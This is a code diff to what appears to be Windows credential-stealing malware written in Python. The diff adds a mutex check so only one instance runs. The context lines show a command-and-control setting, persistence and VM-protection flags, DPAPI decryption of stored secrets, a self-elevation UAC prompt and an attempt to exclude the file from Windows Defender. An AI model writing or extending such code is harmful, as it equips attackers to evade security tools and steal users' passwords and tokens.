@@ -24,6 +24,7 @@ from urllib3 import PoolManager, HTTPResponse
 class Settings:
 
     C2 = "%c2%"
+    Mutex = "%mutex%"
     PingMe = bool("%pingme%")
     Vmprotect = bool("%vmprotect%")
     Startup = bool("%startup%")
@@ -168,6 +169,13 @@ class Tasks:
             thread.join()
 
 class Syscalls:
+
+    @staticmethod
+    def CreateMutex(mutex: str) -> bool:
+        kernel32 = ctypes.windll.kernel32
+        mutex = kernel32.CreateMutexA(None, False, mutex)
+
+        return kernel32.GetLastError() != 183
     
     @staticmethod
     def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: # Calls the CryptUnprotectData function from crypt32.dll
@@ -1598,6 +1606,11 @@ if __name__ == "__main__" and os.name == "nt":
                 Logger.info("Showing UAC prompt to user (Application will restart)")
                 ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                 os._exit(0)
+    
+    Logger.info("Trying to create mutex")
+    if not Syscalls.CreateMutex(Settings.Mutex): 
+        Logger.info("Mutex already exists, exiting")
+        os._exit(0) # If mutex already exists, exit (to prevent multiple instances from running)
     
     if Utility.GetSelf()[1]: 
         Logger.info("Trying to exclude the file from Windows defender")
